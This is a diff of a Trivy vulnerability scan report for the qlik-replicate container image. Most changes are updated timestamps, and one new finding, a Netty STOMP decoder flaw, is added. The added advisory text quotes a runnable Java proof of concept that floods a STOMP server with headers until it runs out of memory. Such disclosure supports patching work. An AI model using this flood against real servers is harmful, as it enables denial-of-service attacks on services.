@@ -3,8 +3,8 @@
   "Trivy": {
     "Version": "0.70.0"
   },
-  "ReportID": "019f5efd-2144-7110-9427-12afc1b7d2c2",
-  "CreatedAt": "2026-07-14T04:57:55.268070927Z",
+  "ReportID": "019f6424-484f-704d-8f72-9dd1e8d7af08",
+  "CreatedAt": "2026-07-15T04:58:47.247021437Z",
   "ArtifactID": "sha256:5c1e58bcde247e5deb255a80c0063f26151d563cb9e3d9001468cf2e54a185de",
   "ArtifactName": "qlik-replicate:latest",
   "ArtifactType": "container_image",
@@ -21470,7 +21470,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-09T13:17:29.703Z"
+          "LastModifiedDate": "2026-07-14T12:17:12.863Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54513",
@@ -21533,7 +21533,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-09T13:17:29.703Z"
+          "LastModifiedDate": "2026-07-14T12:17:12.863Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54514",
@@ -21884,7 +21884,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-09T13:17:29.703Z"
+          "LastModifiedDate": "2026-07-14T12:17:12.863Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54514",
@@ -22236,7 +22236,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-09T13:17:29.703Z"
+          "LastModifiedDate": "2026-07-14T12:17:12.863Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54513",
@@ -22299,7 +22299,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-09T13:17:29.703Z"
+          "LastModifiedDate": "2026-07-14T12:17:12.863Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54513",
@@ -22362,7 +22362,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-09T13:17:29.703Z"
+          "LastModifiedDate": "2026-07-14T12:17:12.863Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54514",
@@ -24930,6 +24930,48 @@
           ],
           "PublishedDate": "2026-05-13T19:17:24.323Z",
           "LastModifiedDate": "2026-06-17T10:48:05.893Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44891",
+          "VendorIDs": [
+            "GHSA-vhch-2wf3-m8rp"
+          ],
+          "PkgName": "io.netty:netty-codec-stomp",
+          "PkgPath": "opt/attunity/replicate/java/arep-event-hubs.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-stomp@4.2.10.Final",
+            "UID": "8aa0af51d0f705d6"
+          },
+          "InstalledVersion": "4.2.10.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "DiffID": "sha256:b8704d9194d16de7d5900f937671b34d06188772a07e623efee3083d37357b01"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44891",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:ba59f55403680d5f24c3e59e1b6215979ee53b14ea7d55079e3ca03d6e5bcb30",
+          "Title": "Netty: Denial of Service via Unbounded Headers in StompSubframeDecoder",
+          "Description": "### Summary\nThe StompSubframeDecoder fails to limit the total number of headers or their cumulative size per frame, allowing an attacker to cause an OutOfMemoryError, leading to a Denial of Service.\n\n### Details\n`io.netty.handler.codec.stomp.StompSubframeDecoder` implements the STOMP protocol. The `maxLineLength` parameter restricts the length of individual header lines, but there is no mechanism to limit the total number of headers in a single STOMP frame. An attacker can send a large number of short headers (e.g., `a: 1\\n`), which are accumulated in memory inside the `DefaultStompHeadersSubframe` until the JVM throws an OutOfMemoryError.\n\n### PoC\nRun the server with `-Xmx256m`\n\n```java\npublic final class ServerApp {\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup group = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());\n        try {\n            ChannelFuture serverFuture = new ServerBootstrap()\n                    .group(group)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new StompSubframeDecoder())\n                    .bind(8080)\n                    .sync();\n            serverFuture.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```\n\n```java\npublic final class ClientApp {\n    public static void main(String[] args) throws Exception {\n        try (Socket socket = new Socket(\"127.0.0.1\", 8080)) {\n            OutputStream out = socket.getOutputStream();\n\n            out.write(\"CONNECT\\n\".getBytes(StandardCharsets.UTF_8));\n\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i \u003c 1000; i++) {\n                sb.append(\"a:1\\n\");\n            }\n            byte[] bulkHeaders = sb.toString().getBytes(StandardCharsets.UTF_8);\n\n            for (int i = 1; i \u003c= 50_000; i++) {\n                out.write(bulkHeaders);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n### Impact\nDenial of Service: An attacker can easily exhaust the server's memory by sending a single malicious STOMP message. Any server exposing a STOMP endpoint based on StompSubframeDecoder is vulnerable to DoS.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/security/advisories/GHSA-vhch-2wf3-m8rp"
+          ]
         },
         {
           "VulnerabilityID": "CVE-2026-44249",
